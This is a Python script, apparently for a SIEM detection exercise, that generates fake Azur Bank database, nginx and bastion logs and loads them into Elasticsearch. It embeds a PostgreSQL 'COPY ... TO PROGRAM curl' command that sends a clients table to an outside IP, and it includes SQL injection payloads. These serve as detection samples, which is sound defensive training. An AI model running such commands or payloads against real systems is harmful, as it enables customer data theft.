#!/usr/bin/env python3
"""Génère et injecte de faux logs bancaires (format ECS) dans Elastic.

Usage :
    export ES_URL="https://...elastic.cloud:443"
    export ES_API_KEY="..."          # clé API encodée (base64 id:key)
    python3 gen_logs_banque.py               # 24h d'historique + attaques
    python3 gen_logs_banque.py --attack-now  # rejoue seulement l'exfiltration maintenant (démo live)

Data streams créés :
    logs-db.audit-banque      audit base clients (use case groupe 3)
    logs-nginx.access-banque  portail web clients
    logs-bastion.auth-banque  authentification bastion / AD
"""
import argparse
import json
import os
import random
import sys
import urllib.request
from datetime import datetime, timedelta, timezone

NS = "banque"
NOW = datetime.now(timezone.utc)

USERS = ["a.martin", "c.dupont", "l.bernard", "s.petit", "m.durand", "j.leroy", "n.moreau", "e.simon"]
ADMINS = ["adm.rousseau", "adm.fontaine"]
ATTACKER = "c.dupont"  # compte compromis du scénario
ATTACKER_IP = "10.20.30.47"
INTERNAL_IPS = [f"10.20.30.{i}" for i in range(10, 60)]
BASTION_IP = "10.0.5.10"
DB_HOST = "db-clients-01"
DB_IP = "10.10.1.20"
EXFIL_DEST = "185.220.101.34"
SQLI_IP = "45.146.165.37"
BRUTE_IP = "91.240.118.172"
PUBLIC_IPS = [f"{a}.{b}.{c}.{d}" for a, b, c, d in
              [(78, 192, 10, 4), (90, 84, 2, 77), (82, 66, 120, 9), (176, 31, 44, 2), (92, 184, 105, 61),
               (109, 7, 220, 13), (88, 172, 3, 200), (81, 250, 66, 18)]]
TABLES = ["clients", "comptes", "operations", "cartes", "agences"]
NGINX_PATHS = ["/", "/login", "/compte/solde", "/compte/operations", "/virement", "/virement/confirmer",
               "/static/app.js", "/static/style.css", "/api/v1/comptes", "/api/v1/beneficiaires", "/logout"]
UAS = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/130.0 Safari/537.36",
       "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148",
       "AzurBank-Mobile/4.2.1 (Android 15)"]


def ts(dt):
    return dt.strftime("%Y-%m-%dT%H:%M:%S.") + f"{dt.microsecond // 1000:03d}Z"


def base(dt, dataset, kind="event"):
    return {
        "@timestamp": ts(dt),
        "data_stream": {"type": "logs", "dataset": dataset, "namespace": NS},
        "event": {"dataset": dataset, "kind": kind},
        "organization": {"name": "Azur Bank"},
    }


def working_time(day_offset_h):
    """Horodatage aléatoire dans les dernières 24h, pondéré vers les heures ouvrées."""
    while True:
        dt = NOW - timedelta(seconds=random.randint(60, day_offset_h * 3600))
        if 7 <= dt.hour < 20 or random.random() < 0.08:
            return dt


# ---------- DB audit ----------
def db_event(dt, user, ip, action, table, rows=1, outcome="success"):
    d = base(dt, "db.audit")
    d["event"].update({"action": action, "category": ["database"], "type": ["access"], "outcome": outcome})
    d.update({
        "user": {"name": user},
        "source": {"ip": ip},
        "host": {"name": DB_HOST, "ip": [DB_IP]},
        "object": table,  # champ utilisé par la règle de l'énoncé
        "db": {"system": "postgresql", "name": "core_clients", "table": table, "rows": rows,
               "statement": f"SELECT * FROM {table} WHERE id = $1" if action == "select"
               else f"COPY {table} TO STDOUT"},
        "message": f"AUDIT: SESSION,{action.upper()},{table},user={user},rows={rows}",
    })
    return d


def gen_db_background():
    out = []
    for _ in range(3000):
        u = random.choice(USERS)
        out.append(db_event(working_time(24), u, random.choice(INTERNAL_IPS), "select",
                            random.choices(TABLES, [5, 3, 3, 1, 1])[0], rows=1))
    for _ in range(40):
        out.append(db_event(working_time(24), random.choice(USERS), random.choice(INTERNAL_IPS),
                            random.choice(["update", "insert"]), random.choice(["comptes", "operations"])))
    return out


def gen_db_exfil(start):
    """Compte compromis : ~620 lectures 'clients' en 8 min puis un export."""
    out = []
    n = random.randint(600, 650)
    for i in range(n):
        dt = start + timedelta(seconds=i * 480 / n + random.random())
        out.append(db_event(dt, ATTACKER, ATTACKER_IP, "select", "clients", rows=1))
    e = db_event(start + timedelta(seconds=500), ATTACKER, ATTACKER_IP, "export", "clients", rows=n)
    e["destination"] = {"ip": EXFIL_DEST, "port": 443}
    e["db"]["statement"] = "COPY clients TO PROGRAM 'curl -T - https://185.220.101.34/u'"
    out.append(e)
    return out


# ---------- Portail web (nginx) ----------
def nginx_event(dt, ip, method, path, status, ua, size=None):
    d = base(dt, "nginx.access")
    d["event"].update({"category": ["web"], "type": ["access"],
                       "outcome": "success" if status < 400 else "failure"})
    size = size or random.randint(300, 40000)
    d.update({
        "source": {"ip": ip},
        "host": {"name": "web-portail-01"},
        "http": {"request": {"method": method}, "response": {"status_code": status, "body": {"bytes": size}}},
        "url": {"original": path, "path": path.split("?")[0], "domain": "banque.azurbank.example"},
        "user_agent": {"original": ua},
        "message": f'{ip} - - "{method} {path} HTTP/1.1" {status} {size} "-" "{ua}"',
    })
    return d


def gen_nginx():
    out = []
    for _ in range(3000):
        p = random.choice(NGINX_PATHS)
        m = "POST" if p in ("/login", "/virement", "/virement/confirmer") else "GET"
        st = random.choices([200, 302, 304, 401, 404, 500], [80, 6, 6, 4, 3, 1])[0]
        out.append(nginx_event(working_time(24), random.choice(PUBLIC_IPS), m, p, st, random.choice(UAS)))
    # Tentatives d'injection SQL sur le portail (règle bonus)
    start = NOW - timedelta(hours=5)
    payloads = ["/compte/operations?id=1'%20OR%20'1'='1", "/api/v1/comptes?id=1%20UNION%20SELECT%20null,iban,null%20FROM%20clients--",
                "/login?user=admin'--", "/compte/solde?id=1;DROP%20TABLE%20clients"]
    for i in range(60):
        out.append(nginx_event(start + timedelta(seconds=i * 7), SQLI_IP, "GET", random.choice(payloads),
                               random.choice([403, 500, 200]), "sqlmap/1.8.11#stable (https://sqlmap.org)"))
    return out


# ---------- Bastion / AD ----------
def auth_event(dt, user, ip, outcome, mfa=True, target="srv-cbs-01"):
    d = base(dt, "bastion.auth")
    d["event"].update({"action": "logon", "category": ["authentication"], "type": ["start"], "outcome": outcome})
    d.update({
        "user": {"name": user, "roles": ["admin"] if user.startswith("adm.") else ["user"]},
        "source": {"ip": ip},
        "host": {"name": "bastion-01", "ip": [BASTION_IP]},
        "destination": {"address": target},
        "bastion": {"mfa": mfa, "protocol": "ssh" if user.startswith("adm.") else "rdp"},
        "message": f"Authentication {outcome} for {user} from {ip} to {target} (mfa={mfa})",
    })
    return d


def gen_bastion():
    out = []
    for _ in range(600):
        u = random.choice(USERS + ADMINS)
        ok = random.random() > 0.05
        out.append(auth_event(working_time(24), u, random.choice(INTERNAL_IPS), "success" if ok else "failure",
                              target=random.choice(["srv-cbs-01", "db-clients-01", "srv-swift-gw", "ws-agence-12"])))
    # Brute force puis succès (règle bonus)
    start = NOW - timedelta(hours=9)
    for i in range(45):
        out.append(auth_event(start + timedelta(seconds=i * 4), "adm.fontaine", BRUTE_IP, "failure", mfa=False))
    out.append(auth_event(start + timedelta(seconds=200), "adm.fontaine", BRUTE_IP, "success", mfa=False))
    # Connexion du compte compromis juste avant l'exfiltration
    out.append(auth_event(NOW - timedelta(minutes=42), ATTACKER, ATTACKER_IP, "success", target="db-clients-01"))
    return out


# ---------- Envoi ----------
def bulk(docs):
    url, key = os.environ.get("ES_URL"), os.environ.get("ES_API_KEY")
    if not url or not key:
        sys.exit("Définir ES_URL et ES_API_KEY")
    docs.sort(key=lambda d: d["@timestamp"])
    total_err = 0
    for i in range(0, len(docs), 1000):
        chunk = docs[i:i + 1000]
        body = "".join(
            json.dumps({"create": {"_index": f"logs-{d['data_stream']['dataset']}-{NS}"}}) + "\n" + json.dumps(d) + "\n"
            for d in chunk)
        req = urllib.request.Request(url.rstrip("/") + "/_bulk", data=body.encode(), method="POST",
                                     headers={"Authorization": f"ApiKey {key}",
                                              "Content-Type": "application/x-ndjson"})
        with urllib.request.urlopen(req, timeout=60) as r:
            res = json.load(r)
        if res.get("errors"):
            errs = [it["create"]["error"] for it in res["items"] if "error" in it["create"]]
            total_err += len(errs)
            print("Erreur exemple :", errs[0])
    print(f"{len(docs)} documents envoyés, {total_err} erreurs")


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--attack-now", action="store_true", help="injecte uniquement l'exfiltration, maintenant")
    args = ap.parse_args()
    random.seed()
    if args.attack_now:
        docs = gen_db_exfil(NOW - timedelta(seconds=510))
    else:
        docs = gen_db_background() + gen_db_exfil(NOW - timedelta(minutes=40)) + gen_nginx() + gen_bastion()
    bulk(docs)


if __name__ == "__main__":
    main()
